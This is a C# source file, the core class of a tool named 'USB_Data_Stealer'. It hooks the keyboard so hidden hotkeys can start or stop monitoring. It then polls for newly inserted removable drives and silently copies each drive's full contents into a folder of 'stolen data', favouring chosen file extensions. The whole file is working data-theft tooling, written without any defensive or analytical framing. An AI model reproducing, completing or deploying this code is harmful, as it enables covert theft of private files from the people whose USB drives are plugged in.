#region

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Input;
using USB_Data_Stealer.Core.Logging;

#endregion

namespace USB_Data_Stealer.Core
{
    public partial class UsbStealer : INotifyPropertyChanged
    {
        public delegate void CopyProgressChanged(int percentage, Guid fileTransferId);

        public delegate void CopyProgressFinished(Guid fileTransferId);

        public delegate void CopyProgressStarted(Guid fileTransferId);

        public delegate void NewDriverAdded(DriveInfo driveInfo, string destinationPath);

        public delegate void NewLogMessageAppended(Message message);

        public delegate void StartedMonitor();

        public delegate void StoppedMonitor();

        private readonly KeyboardHook _keyboardHook;
        private bool _isMonitoring;

        private int _monitorRefreshRate;

        private Key _startMonitorHotKey;
        private string _stolenDataPath;
        private Key _stopMonitorHotKey;

        public UsbStealer(NewLogMessageAppended onNewLogMessageAppended)
        {
            _keyboardHook = new KeyboardHook();
            _keyboardHook.OnKeyPressed += _keyboardHook_OnKeyPressed;
            _keyboardHook.HookKeyboard();
            OnNewLogMessageAppended += onNewLogMessageAppended;
            Logger.OnNewLogMessageAppended += OnOnNewLogMessageAppended;
            Logger.Append(new Message(Message.EventTypes.Info, "Initialized."));
            FileTransferSettings = new FileTransfererSettings();
        }

        public FileTransfererSettings FileTransferSettings { get; set; }

        public bool EnableFileLogging
        {
            get { return Logger.EnableLogFile; }
            set { Logger.EnableLogFile = value; }
        }

        public string LogPath
        {
            get { return Logger.LogPath; }
            set
            {
                if (Logger.LogPath == value) return;
                Logger.LogPath = value;
            }
        }

        public Key StartMonitorHotKey
        {
            get { return _startMonitorHotKey; }
            set
            {
                if (_startMonitorHotKey == value) return;

                _startMonitorHotKey = value;

                OnPropertyChanged(new PropertyChangedEventArgs("StartMonitorHotKey"));
                Logger.Append(new Message(Message.EventTypes.Info,
                    "Start Hot-Key changed to: " + StartMonitorHotKey + "."));
            }
        }

        public Key StopMonitorHotKey
        {
            get { return _stopMonitorHotKey; }
            set
            {
                if (_stopMonitorHotKey == value) return;
                _stopMonitorHotKey = value;
                OnPropertyChanged(new PropertyChangedEventArgs("StopMonitorHotKey"));
                Logger.Append(new Message(Message.EventTypes.Info,
                    "Stop Hot-Key changed to: " + StopMonitorHotKey + "."));
            }
        }

        private DriveInfo[] WhitelistDrivers { get; set; }

        public string StolenDataPath
        {
            get { return _stolenDataPath; }
            set
            {
                if (_stolenDataPath == value) return;
                _stolenDataPath = value;
                OnPropertyChanged(new PropertyChangedEventArgs("StolenDataPath"));
                Logger.Append(new Message(Message.EventTypes.Info,
                    "Stolen Data Path changed to: " + StolenDataPath + "."));
            }
        }

        public int MonitorRefreshRate
        {
            get { return _monitorRefreshRate; }
            set
            {
                if (_monitorRefreshRate == value || value < 0) return;
                _monitorRefreshRate = value;
                OnPropertyChanged(new PropertyChangedEventArgs("MonitorRefreshRate"));
                Logger.Append(new Message(Message.EventTypes.Info,
                    "Monitor Refresh Rate changed to: " + MonitorRefreshRate + "."));
            }
        }

        public bool IsMonitoring
        {
            get { return _isMonitoring; }
            private set
            {
                if (IsMonitoring == value) return;
                _isMonitoring = value;
                OnPropertyChanged(new PropertyChangedEventArgs("IsMonitoring"));
                Logger.Append(new Message(Message.EventTypes.Info,
                    "Monitor status changed to: " + IsMonitoring + "."));
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;

        public event NewLogMessageAppended OnNewLogMessageAppended;

        private void OnOnNewLogMessageAppended(Message message)
        {
            OnNewLogMessageAppended?.Invoke(message);
        }

        ~UsbStealer()
        {
            _keyboardHook.UnHookKeyboard();
        }

        private void _keyboardHook_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            if (e.KeyPressed == StartMonitorHotKey)
            {
                StartMonitoring();
            }
            else if (e.KeyPressed == StopMonitorHotKey)
            {
                StopMonitoring();
            }
        }

        public event NewDriverAdded OnNewDriverAdded;

        public event StoppedMonitor OnStoppedMonitor;

        public event StartedMonitor OnStartedMonitor;

        private void CheckNewDrivers()
        {
            WhitelistDrivers = GetCurrentReadyRemovableDrivers().ToArray();
            do
            {
                Debug.WriteLine("[" + DateTime.Now + "] Checking for new drivers...");
                var currentDrivers = GetCurrentReadyRemovableDrivers().ToArray();
                foreach (DriveInfo currentDriver in currentDrivers)
                {
                    if (WhitelistDrivers.FirstOrDefault(
                        x => x.RootDirectory.Root.Name == currentDriver.RootDirectory.Root.Name) == null)
                    {
                        OnOnNewDriverAdded(currentDriver);
                    }
                }
                WhitelistDrivers = currentDrivers;
                Thread.Sleep(MonitorRefreshRate);
            } while (IsMonitoring);
        }

        private static IEnumerable<DriveInfo> GetCurrentReadyRemovableDrivers()
            => DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Removable && d.IsReady);

        public void StartMonitoring()
        {
            var thread = new Thread(CheckNewDrivers) {IsBackground = true};
            thread.Start();
            IsMonitoring = true;
            OnOnStartedMonitor();
        }

        public void StopMonitoring()
        {
            IsMonitoring = false;
            OnOnStoppedMonitor();
        }

        private void OnPropertyChanged(PropertyChangedEventArgs e)
        {
            PropertyChanged?.Invoke(this, e);
        }

        private void OnOnNewDriverAdded(DriveInfo driveinfo)
        {
            string destinationDir = Path.Combine(StolenDataPath, driveinfo.VolumeLabel);
            OnNewDriverAdded?.Invoke(driveinfo, destinationDir);
            Logger.Append(new Message(Message.EventTypes.Info,
                "New Driver: " + driveinfo.VolumeLabel + " (" + driveinfo.Name + ")"));
            FileTransfer fileTransfer;
            try
            {
                fileTransfer = new FileTransfer(driveinfo.RootDirectory.FullName,
                    destinationDir, FileTransferSettings);
            }
            catch (Exception ex)
            {
                Logger.Append(new Message(Message.EventTypes.Error,
                    "Error starting Data transferring from  \"" + driveinfo.RootDirectory.FullName + "\" to \"" +
                    StolenDataPath + "\". " + ex.Message));
                return;
            }

            fileTransfer.PrecedenceExtensions = FileTransferSettings.PrecedenceExtensions;
            fileTransfer.CopyProgressChanged += OnCopyProgressChanged;
            fileTransfer.CopyProgressStarted += OnCopyProgressStarted;
            fileTransfer.CopyProgressFinished += OnCopyProgressFinished;
            fileTransfer.BeginTransfer();
            Logger.Append(new Message(Message.EventTypes.Info,
                "Data transferring from  \"" + driveinfo.RootDirectory.FullName + "\" to \"" + StolenDataPath +
                "\" started."));
        }

        public event CopyProgressFinished OnCopyProgressFinished;

        public event CopyProgressStarted OnCopyProgressStarted;

        public event CopyProgressChanged OnCopyProgressChanged;

        private void OnOnStoppedMonitor()
        {
            OnStoppedMonitor?.Invoke();
        }

        private void OnOnStartedMonitor()
        {
            OnStartedMonitor?.Invoke();
        }
    }
}